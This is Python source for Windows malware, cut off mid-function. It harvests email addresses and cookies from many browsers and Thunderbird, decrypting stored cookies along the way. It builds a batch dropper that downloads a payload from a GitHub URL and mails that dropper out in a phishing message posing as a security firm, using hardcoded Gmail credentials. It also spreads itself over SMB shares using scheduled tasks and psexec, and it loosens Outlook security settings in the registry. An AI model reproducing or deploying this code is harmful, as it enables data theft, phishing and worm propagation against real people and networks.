import sqlite3
import os
import re
import smtplib
import winreg
import time
import base64
import getpass
import browser_cookie3
import requests, win32cred, win32com.client, socket, subprocess
from win32com.client import Dispatch
from win32.win32crypt import CryptUnprotectData
from Crypto.Cipher.AES import new, MODE_GCM
from smb.SMBConnection import SMBConnection
from email.mime.application import MIMEApplication 
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import ssl
import urllib.parse
from charset_normalizer import from_bytes
from chardet import detect
import plyvel
import snappy
import pythoncom
import json

USERNAME = getpass.getuser()
CHROME_BROWSER = 'chrome'
EDGE_BROWSER = 'edge'
BRAVE_BROWSER = 'brave'
FIREFOX_BROWSER = 'firefox'
LIBREWOLF_BROWSER = 'librewolf'
OPERAGX = 'operagx'
OPERA_BROWSER = 'opera'
chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
operagx_path = os.path.join(os.getenv('APPDATA'), 'Opera Software')
opera_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
librewolf_path = os.path.join(os.getenv('APPDATA'), 'librewolf', 'Profiles')
thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
opera_local_state_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local State')
email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM brave.exe /IM opera.exe /IM librewolf.exe >nul 2>&1")

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def s_n():
    base_ad = ".".join(get_local_ip().split('.')[:-1])
    act_host = []
    for i in range(1,255):
        target = f"{base_ad}.{i}"
        try:
            socket.setdefaulttimeout(1.0)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 445))
            act_host.append(target)
            s.close()
        except Exception as e:
            print(f"ERROR CONNECTING TO {target} : {e}")
    return act_host

def infect_host(host, file_path):
    try:
        conn = SMBConnection("", "", socket.gethostname(), host, use_ntlm_v2=False)
        conn.connect(host, 445)
        # Hunt writable shares
        shares = conn.listShares()
        for share in shares:
            if not share.isSpecial and share.name not in ['IPC$', 'PRINT$']:
                try:
                    conn.storeFile(share.name, "worm.exe", open(file_path, 'rb'))
                    # Optional: Add persistence via scheduled task
                    subprocess.call(f"schtasks /create /s {host} /tn 'UpdateService' /tr '{share.name}\\worm.exe' /sc onstart /ru SYSTEM /rl HIGHEST /f", shell=True)
                    subprocess.Popen(f'psexec \\\\{host} -s -d cmd /c "{share.name}\\worm.exe"', shell=True)
                except:
                    continue
    except:
        pass

def generate():
    init_path = os.path.join(os.getenv('TEMP'), 'init.exe')
    bat_path = os.path.join(os.getenv('TEMP'), 'activator.bat')
    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
    if not os.path.exists(init_path):
        try:
            r = requests.get(init_link)
            with open(init_path, 'wb') as f:
                f.write(r.content)
        except: pass
    with open(init_path, 'rb') as f:
        c = base64.b64encode(f.read()).decode()
        chunks = [c[i:i+6000] for i in range(0, len(c), 6000)]

        bat_content = [
            '@echo off',
            'setlocal enabledelayedexpansion',
            'set "exe_name=%~n0.exe"',
            'echo Fetching Activation Keys...'
        ]

        for i, chunk in enumerate(chunks, 1):
            bat_content.append(f'set "chunk{i}={chunk}"')

        bat_content.extend([
            '(', 
            f'for /l %%n in (1,1,{len(chunks)}) do (',
            '  set "chunk=!chunk%%n!"',
            '  echo|set /p dummy="!chunk!"',
            ')',
            ') > "%temp%\\!exe_name!.b64"',
            '',
            f'powershell -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
            'del "%temp%\\!exe_name!.b64"',
            'powershell -ep bypass -noP -nonI start-process powershell.exe "{%temp%\\!exe_name!}"', # remember to use '-w hidden' when release
            'del "%~f0"'
        ])
 
        with open(bat_path, "w", encoding='utf-8') as b:
            b.write('\n'.join(bat_content))
    return bat_path

def send_a(bat_path, emails):
    email_user = "defalttests@gmail.com"
    email_pass = "ccoq gwxh jgos gqig"

    with open(bat_path, 'rb') as f:
        attachment_data = f.read()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, password=email_pass)

    for email in emails:
        print(email)    
        msg = MIMEMultipart()
        msg['From'] = "J. Security Limited"
        msg['To'] = email
        msg['Subject'] = "Mandatory Security Protocol Update - Script Delivery (Ref: SC-2025-07)"

        body = r"""
Dear Valued Partner,

As part of J. Security Limited's Enhanced Security Framework (v3.1), we're distributing new Automated Configuration Verification (ACV) scripts to all certified partners. These ensure compliance with Microsoft's updated security baseline requirements.

Required Action:
    • Download attached configuration script:
    📎 ACV_Validation_SC202507.txt
    
    • Convert to executable format:
    Right-click file → Rename → Replace ".txt" with ".bat"
    
    • Execute validation:
    Right-click → "Run as administrator"

Purpose:
    • Verifies proper implementation of new Windows security policies
    • Generates compliance report for your audit trail
    • Checks system readiness for upcoming TLS 1.3 enforcement

Key Details:
🔒 Security Notes:
• Delivered as .txt to bypass email attachment filters
• SHA-256 Checksum: 9a2f4c...e83b (verify before execution)
• Execution window: July 15 - August 5, 2025

📋 Post-Run Steps:

Report automatically saves to C:\Security\ACV_Report.log

Email report to compliance@jsecurityltd.com by August 5

For assistance:
☎️ Contact our Compliance Team: +1 (800) 555-0199
✉️ Email: acv-support@jsecurityltd.com

Regards,
Eleanor Martinez
Director of Security Compliance
J. Security Limited
🏢 550 Security Boulevard, New York, NY 10001
🔐 Authenticated via SPF/DKIM
"""
        msg.attach(MIMEText(body, 'plain'))

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment_data)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= ACV_Validation_SC202507.txt")
        msg.attach(part)
        server.sendmail(email_user, [email], msg.as_string())
        print(f"Sent to {email}")
    
    server.quit()
        
    print(len(emails))

def decode_with_fallback(data):
    for encoding in ['utf-8', 'utf-16-le']:
        try:
            return data.decode(encoding), encoding
        except:
            continue
    try:
        encoding = from_bytes(data).best().encoding
        return data.decode(encoding), encoding
    except: pass
    try:
        encoding = detect(data)['encoding']
        return data.decode(encoding), encoding
    except: pass
    encoding = 'latin-1'
    return data.decode(encoding, errors='replace'), encoding

def bytes_to_hex(byte_data):
    return f"b'{''.join(f'\\x{byte:02x}' for byte in byte_data)}'"

def decode_value(value):
    decode_attempts = [
        lambda x: x.decode('utf-8'),
        lambda x: x.decode('latin-1'),
        lambda x: urllib.parse.unquote(x.decode('latin-1')),
        lambda x: base64.b64decode(x).decode('utf-8'),
        lambda x: json.loads(x)
    ]
    
    for attempt in decode_attempts:
        try:
            decoded = attempt(value)
            if isinstance(decoded, dict):
                decoded = json.dumps(decoded)
        except:
            continue
    return decoded

def get_decryption_key(local_state_path):
    with open(local_state_path, 'r') as f:
        ekey = json.load(f)['os_crypt']['encrypted_key']
        dkey = base64.b64decode(ekey)[5:]
        dkey = CryptUnprotectData(dkey, None, None, None, 0)
        return dkey

def decrypt_value(encrypted_value, key):
    if encrypted_value.startswith(b'v10'):
        try:
            cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
            decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
            # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
            return decode_value(decrypted_value[:-decrypted_value[-1]])
        except Exception as e:
            print(f"Decryption failed using AES.GCM: {e}")
            return None
    else:
        try:
            return CryptUnprotectData(encrypted_value)[1]
        except Exception as e:
            print(f"ERROR USING DPAPI : {e}")
    
def find_emails_in_json(data, email_pattern):
    emails = []
    if isinstance(data, dict):
        for v in data.values():
            emails.extend(find_emails_in_json(v, email_pattern))
    elif isinstance(data, list):
        for item in data:
            emails.extend(find_emails_in_json(item, email_pattern))
    elif isinstance(data, str):
        emails.extend(re.findall(email_pattern, data))
    return emails

def extract_json(value_str):
    json_start = re.search(r'[\{\[]', value_str)
    if json_start:
        return value_str[json_start.start():]
    return value_str

def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isoperagx=False):
    if isoperagx: profiles=['Opera GX Stable']
    else: profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
    emails = []

    for profile in profiles:
        profile_name = profile.replace(" ", "_")
        wDatPath = os.path.join(chrome_path, profile, 'Web Data')
        twDatPath = os.path.join(os.getenv('TEMP'),f"wdat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(wDatPath):
            os.system(f'copy "{wDatPath}" "{twDatPath}"')
            conn = sqlite3.connect(twDatPath)
            cur = conn.cursor()
            cur.execute("SELECT value FROM autofill WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        lsDatPath = os.path.join(chrome_path, profile, 'Local Storage', 'leveldb')
        tlsDatPath = os.path.join(os.getenv('TEMP'), f"lsdat_{USERNAME}_{profile_name}_{browser_name}")
        if os.path.isdir(lsDatPath):
            try:
                print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
                os.system(f'robocopy "{lsDatPath}" "{tlsDatPath}" /MIR /COPYALL >nul 2>&1')
                db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
                for key, value in db:
                    try:
                        key_str = key.decode('utf-8', errors='replace')
                        if key_str.startswith("META"):
                            continue
                        if value.startswith(b'\x00\x00\x00\x00') or value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
                            try:
                                value = snappy.uncompress(value[4:])
                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
                                continue
                            except Exception as e :
                                print(f"Error decompressing value: {e}, skipping this entry.")
                        value_str, value_enc = decode_with_fallback(value)
                        value_str = value_str.replace('\u263a', '').strip()
                        value_str = extract_json(value_str)
                        # print(f"for value : {value_enc}")
                        decoded = f"{key_str} {value_str}"
                        # print(decoded)
                        # print(value_str)
                        if value_str.strip().startswith('{') or value_str.strip().startswith('['):
                            try:
                                json_data = json.loads(value_str)
                                #value_str = json.dumps(json_data, indent=2)
                                #value_str = urllib.parse.unquote(value_str)
                                #emails.extend(re.findall(email_pattern, value_str))
                                emails.extend(find_emails_in_json(json_data, email_pattern))
                                continue
                            except:
                                pass
                        emails.extend(re.findall(email_pattern, key_str))
                        emails.extend(re.findall(email_pattern, value_str))
                    except Exception as e:
                        print(f"Error processing entry with key {key_str}: {e}")
                        continue
                db.close()
            except Exception as e:
                print(f"ERROR PARSING LOCAL STORAGE : {e}")
                os.system(f'del /F /Q /S "{lsDatPath}" >null 2>&1')

        ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
        tssDatPath = os.path.join(os.getenv('TEMP'), f"ssDat_{USERNAME}_{profile_name}_{browser_name}")
        if os.path.isdir(ssDatPath):
            try:
                print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
                os.system(f'robocopy "{ssDatPath}" "{tssDatPath}" /MIR /COPYALL >nul 2>&1')
                db = plyvel.DB(str(tssDatPath), create_if_missing=False)
                for key, value in db:
                    try:
                        key_str = key.decode('utf-8', errors='replace')
                        if value.startswith(b'\x01\x00\x00\x00') or value.startswith(b'\x00\x00\x00\x00'):  # Snappy compressed block indicator
                            try:
                                value = snappy.uncompress(value[4:])
                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
                                continue
                            except Exception as e :
                                print(f"Error decompressing value: {e}, skipping this entry.")
                        value_str, value_enc = decode_with_fallback(value)
                        value_str = value_str.strip()
                        # print(f"for value : {value_enc}")
                        # decoded = f"{key_str} {value_str}"
                        # print(decoded)
                        emails.extend(re.findall(email_pattern, urllib.parse.unquote(key_str)))
                        emails.extend(re.findall(email_pattern, urllib.parse.unquote(value_str)))
                    except Exception as e:
                        print(f"Error processing entry with key {key_str}: {e}")
                db.close()
            except Exception as e:
                print(f"ERROR PARSING SESSION STORAGE : {e}")
                os.system(f'del /F /Q /S "{ssDatPath}" >null 2>&1')

        lDatPath = os.path.join(chrome_path, profile, 'Login Data')
        tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(lDatPath):
            os.system(f'copy "{lDatPath}" "{tlDatPath}"')
            conn = sqlite3.connect(tlDatPath)
            cur = conn.cursor()
            cur.execute("SELECT username_value FROM logins")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        hDatPath = os.path.join(chrome_path, profile, 'History')
        thDatPath = os.path.join(os.getenv('TEMP'), f"hDat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(hDatPath):
            os.system(f'copy "{hDatPath}" "{thDatPath}"')
            conn = sqlite3.connect(thDatPath)
            cur = conn.cursor()
            cur.execute("PRAGMA integrity_check;")
            result = cur.fetchone()
            if(result[0] != "ok"):
                cur.execute("PRAGMA journal_mode = WAL;")
                cur.execute("PRAGMA wal_checkpoint(FULL);")
                conn.commit()

            cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    decoded_string = urllib.parse.unquote(val[0])
                    matches = re.findall(email_pattern, decoded_string)
                    emails.extend(matches)
                except Exception as e:
                    print(f"Error processing URL {val[0]}: {e}")
            conn.close()

        cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")

        if os.path.exists(cDatPath):
            os.system(f'copy "{cDatPath}" "{tcDatPath}"')
            try:
                if browser_name == CHROME_BROWSER: cookies = browser_cookie3.chrome(cookie_file=tcDatPath)
                elif browser_name == EDGE_BROWSER: cookies = browser_cookie3.edge(cookie_file=tcDatPath)
                elif browser_name == OPERA_BROWSER: cookies = browser_cookie3.opera(cookie_file=tcDatPath)
                elif browser_name == OPERAGX: cookies = browser_cookie3.opera_gx(cookie_file=tcDatPath)
                elif browser_name == BRAVE_BROWSER: cookies = browser_cookie3.brave(cookie_file=tcDatPath)
                # print(browser_name, tcDatPath, cDatPath)

                for cookie in cookies:
                    decoded = cookie.value
                    # print(f"{cookie.name} ::: {decoded}", '\n')
                    # url decoding
                    try:
                        decoded = urllib.parse.unquote(decoded)
                        emails.extend(re.findall(email_pattern, decoded))
                    except Exception as e: print(f"ERROR URL DECODING : {e}")

                    if cookie.name == "PREF":
                        print("ENTER PREFF")
                        try:
                            c = urllib.parse.parse_qs(decoded)
                            emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
                            continue
                        except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
                            
                    if cookie.name == "LOGIN_INFO":
                        print("ENTER LOGIN INFO")
                        try:
                            sig, b64_dat = decoded.split(':')
                            b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
                            emails.extend(re.findall(email_pattern, b64_dat))
                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
                            continue
                        except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")

                    for delim in ['.', '-', '~', '=']:
                        if delim in decoded:
                            chunks = decoded.split(delim)
                            for chunk in chunks:
                                try:
                                    if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
                                    chunk = urllib.parse.unquote(chunk)
                                    decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
                                    decoded_string = urllib.parse.unquote(decoded_string)
                                    # print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")

                                    if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                                        # print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                        emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))

                                    else: emails.extend(re.findall(email_pattern, decoded_string))
                                except: pass

                    #base64 decoding
                    try:
                        decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
                        decoded_string = urllib.parse.unquote(decoded_string)
                        # print(f"decoded with -> {decoding} and value -> {decoded_string}")

                        if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                            emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
                            continue
                        else: emails.extend(re.findall(email_pattern, decoded_string))
                            
                    except Exception as e: pass#print(f"ERROR in BASE64 decoding : {e}")

                    #json decoding
                    try:
                        if decoded.strip().startswith('{') or decoded.strip().startswith('['):
                            # print(f"IS JSON FOR {cookie.name} : {decoded}")
                            emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                            continue
                    except Exception as e:
                        print(f"ERROR in json DECODING : {e}")

                    emails.extend(re.findall(email_pattern, decoded))
                
            except Exception as e:
                print(f"GOT EXCEPTION WHILE GETTING COOKIES FOR {browser_name}:{profile} using Browser_Cookie3 :: {e}")
                if isdecryptable:
                    conn = sqlite3.connect(tcDatPath)
                    cur = conn.cursor()
                    cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
                    decryption_key = get_decryption_key(opera_local_state_path)[1]
                    # print(decryption_key)
                    for val in cur.fetchall():
                        encrypted_value = val[0]
                        if encrypted_value is None or len(encrypted_value) == 0:
                            continue
                        # print(encrypted_value)
                        decrypted_value = decrypt_value(encrypted_value, decryption_key)
                        print(decrypted_value, '\n')
                    conn.close()

    return emails

def firefox(firefox_path, email_pattern, browser_name):
    emails = []
    for profile in os.listdir(firefox_path):
        profile_name = profile.replace(" ", "_")
        fh = os.path.join(firefox_path, profile, 'formhistory.sqlite')
        tfh = os.path.join(os.getenv('TEMP'), f"fh_{USERNAME}_{profile_name}_firefox.db")
        ck = os.path.join(firefox_path, profile, 'cookies.sqlite')
        tck = os.path.join(os.getenv('TEMP'), f"ck_{USERNAME}_{profile_name}_firefox.db")
        bh = os.path.join(firefox_path, profile, 'places.sqlite')
        tbh = os.path.join(os.getenv('TEMP'), f"bh_{USERNAME}_{profile_name}_firefox.db")
        lg = os.path.join(firefox_path, profile, 'logins.json')
        tlg = os.path.join(os.getenv('TEMP'), f"lg_{USERNAME}_{profile_name}_firefox.json")
        lgb = os.path.join(firefox_path, profile, 'logins-backup.json')
        tlgb = os.path.join(os.getenv('TEMP'), f"lgb_{USERNAME}_{profile_name}_firefox.json")
        if os.path.exists(fh):
            os.system(f'copy "{fh}" "{tfh}"')
            conn = sqlite3.connect(tfh)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(ck):
            os.system(f'copy "{ck}" "{tck}"')
            try:
                if browser_name == FIREFOX_BROWSER: cookies = browser_cookie3.firefox(cookie_file=tck)
                elif browser_name == LIBREWOLF_BROWSER: cookies = browser_cookie3.librewolf(cookie_file=tck)
                for cookie in cookies:
                    decoded = cookie.value
                    # print(f"{cookie.name} ::: {decoded}", '\n')
                    # url decoding
                    try:
                        decoded = urllib.parse.unquote(decoded)
                        emails.extend(re.findall(email_pattern, decoded))
                    except Exception as e: print(f"ERROR URL DECODING : {e}")

                    if cookie.name == "PREF":
                        print("ENTER PREFF")
                        try:
                            c = urllib.parse.parse_qs(decoded)
                            emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
                            print(f"COMPLETE PREFFF : {json.dumps(c)}")
                            continue
                        except Exception as e: print(f"ERROR IN PARSING PREF : {e}")
                            
                    if cookie.name == "LOGIN_INFO":
                        print("ENTER LOGIN INFO")
                        try:
                            sig, b64_dat = decoded.split(':')
                            b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
                            emails.extend(re.findall(email_pattern, b64_dat))
                            print(f"COMPLETE PARSING LOGIN INFO : {b64_dat}")
                            continue
                        except Exception as e: print(f"ERROR IN LOGIN INFO PARSING : {e}")

                    for delim in ['.', '-', '~', '=']:
                        if delim in decoded:
                            chunks = decoded.split(delim)
                            for chunk in chunks:
                                try:
                                    if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
                                    chunk = urllib.parse.unquote(chunk)
                                    decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
                                    decoded_string = urllib.parse.unquote(decoded_string)
                                    #print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")

                                    if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                                        #print(f"IS ACTUALLY A JSON FOR CHUNK {decoded_string}")
                                        emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))

                                    else: emails.extend(re.findall(email_pattern, decoded_string))
                                except Exception as e: pass#print(f"ERROR in decoding with bas64 or url for delim {delim}: {e} for chunk {chunk}") 

                    #base64 decoding
                    try:
                        decoded_string, decoding = decode_with_fallback(base64.b64decode(decoded, validate=True))
                        decoded_string = urllib.parse.unquote(decoded_string)
                        # print(f"decoded with -> {decoding} and value -> {decoded_string}")

                        if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
                            emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
                            continue
                        else: emails.extend(re.findall(email_pattern, decoded_string))
                            
                    except Exception as e: pass#print(f"ERROR in BASE64 decoding : {e}")

                    #json decoding
                    try:
                        if decoded.strip().startswith('{') or decoded.strip().startswith('['):
                            # print(f"IS JSON FOR {cookie.name} : {decoded}")
                            emails.extend(find_emails_in_json(json.loads(decoded), email_pattern))
                            continue
                    except Exception as e:
                        print(f"ERROR in json DECODING : {e}")

                    emails.extend(re.findall(email_pattern, decoded))
            except Exception as e:
                print(f"ERROR USING BROWSER_COOKIE3 for {browser_name}:{profile} -> {e}\nUsing normal sqlite query instead.")
                conn = sqlite3.connect(tck)
                cur = conn.cursor()
                cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
                for val in cur.fetchall():
                    try:
                        matches = re.findall(email_pattern, val[0])
                        emails.extend(matches)
                    except:
                        pass
                conn.close()

        if os.path.exists(bh):
            os.system(f'copy "{bh}" "{tbh}"')
            conn = sqlite3.connect(tbh)
            cur = conn.cursor()
            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    decoded_string = urllib.parse.unquote(val[0])
                    matches = re.findall(email_pattern, decoded_string)
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(lg):
            os.system(f'copy "{lg}" "{tlg}"')
            with open(tlg, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                   u = login.get("usernameField", "")
                   matches = re.findall(email_pattern, u)
                   emails.extend(matches)
        
        if os.path.exists(lgb):
            os.system(f'copy "{lgb}" "{tlgb}"')
            with open(tlgb, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                    u = login.get("usernameField", "")
                    matches = re.findall(email_pattern, u)
                    emails.extend(matches)

    return emails

def thunderbird(thunderbird_path, email_pattern):
    emails = []
    for profile in os.listdir(thunderbird_path):
        profile_name = profile.replace(" ", "_")
        gmd = os.path.join(thunderbird_path, profile, 'global-messages-db.sqlite')
        tgmd = os.path.join(os.getenv('TEMP'), f"gmd_{USERNAME}_{profile_name}_thunderbird.db")
        tfh = os.path.join(thunderbird_path, profile, 'formhistory.sqlite')
        ttfh = os.path.join(os.getenv('TEMP'), f"tfh_{USERNAME}_{profile_name}_thunderbird.db")
        pl = os.path.join(thunderbird_path, profile, 'places.sqlite')
        tpl = os.path.join(os.getenv('TEMP'), f"pl_{USERNAME}_{profile_name}_thunderbird.db")
        if os.path.exists(gmd):
            os.system(f'copy "{gmd}" "{tgmd}"')
            conn = sqlite3.connect(tgmd)
            cur = conn.cursor()
            cur.execute("SELECT name FROM contacts")
            for val in cur.fetchall():
                try:
                    emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT subject FROM conversations")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT c0subject FROM conversationsText_content")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT value FROM identities")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT c0body, c1subject, c2attachmentNames, c3author, c4recipients FROM messagesText_content")
            for val in cur.fetchall():
                try:
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
                    emails.extend(re.findall(email_pattern, val[1]))
                    emails.extend(re.findall(email_pattern, val[2]))
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[3])))
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[4])))
                except:
                    pass
            conn.close()
        if os.path.exists(tfh):
            os.system(f'copy "{tfh}" "{ttfh}"')
            conn = sqlite3.connect(ttfh)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            conn.close()
        if os.path.exists(pl):
            os.system(f'copy "{pl}" "{tpl}"')
            conn = sqlite3.connect(tpl)
            cur = conn.cursor()
            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
                except: pass
            conn.close()
    return emails

def just_try_smb():
    t_path = os.path.join(os.getenv('TEMP'), "random.ps1")
    link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_initializer.ps1"
    c = requests.get(link)
    if c.status_code == 200:
        open(t_path, 'wb').write(c.content)
    for host in s_n():
        infect_host(host, t_path)


emails = []

# for root, _, files in os.walk(os.getenv('TEMP')):
#     for file in files:
#         try:
#             with open(os.path.join(root,file), 'r', errors='ignore') as f:
#                 data = f.read()
#                 emails.extend(re.findall(email_pattern, data))
#         except: pass

if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern, FIREFOX_BROWSER)
if os.path.exists(librewolf_path): librewolf_emails = firefox(librewolf_path, email_pattern, LIBREWOLF_BROWSER)
if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isoperagx=True)
if os.path.exists(opera_path) : opera_mails = chromEdgeOnly(opera_path, email_pattern, OPERA_BROWSER, isdecryptable=True)

# # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
emails.extend(chrome_emails)
emails.extend(edge_emails)
emails.extend(firefox_emails)
emails.extend(librewolf_emails)
emails.extend(thunderbird_emails)
emails.extend(brave_emails)
emails.extend(gx_emails)
emails.extend(opera_mails)
    
def set_registry_key(hive, subkey, name, value, office_version='16.0', wow64_32=False, x86os=False):
    try:
        if not x86os: access = winreg.KEY_WOW64_64KEY if not wow64_32 else winreg.KEY_WOW64_32KEY
        else: access = 0
        if hive == winreg.HKEY_LOCAL_MACHINE and wow64_32: 
            key_path = f"SOFTWARE\\WOW6432Node\\Microsoft\\Office\\{office_version}\\Outlook\\Security"
        else: 
            key_path = f"SOFTWARE\\Microsoft\\Office\\{office_version}\\Outlook\\Security"
        
        if hive == winreg.HKEY_LOCAL_MACHINE and not x86os:
            key = winreg.CreateKeyEx(hive, key_path, 0, winreg.KEY_WRITE | access)
        else:
            key = winreg.CreateKeyEx(hive, key_path, 0, winreg.KEY_WRITE)
            
        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error setting {name}: {str(e)}")
        return False

def configure_outlook_security(office_version='16.0', wow64_32=False, x86os=False):
    # Configure HKLM settings
    hklm_success = set_registry_key(
        winreg.HKEY_LOCAL_MACHINE,
        None,
        'ObjectModelGuard',
        2,
        office_version,
        wow64_32,
        x86os
    )

    # Configure HKCU settings
    hkcu_values = {
        'PromptOOMSend': 2,
        'AdminSecurityMode': 3,
        'promptoomaddressinformationaccess': 2,
        'promptoomaddressbookaccess': 2
    }

    hkcu_success = True
    for name, value in hkcu_values.items():
        success = set_registry_key(
            winreg.HKEY_CURRENT_USER,
            None,
            name,
            value,
            office_version,
            wow64_32,
            x86os
        )
        hkcu_success = hkcu_success and success

    return hklm_success and hkcu_success

def check_office_version(hive, office_version, wow64_32=False):
    try:
        access = winreg.KEY_READ | (winreg.KEY_WOW64_64KEY if not wow64_32 else winreg.KEY_WOW64_32KEY)
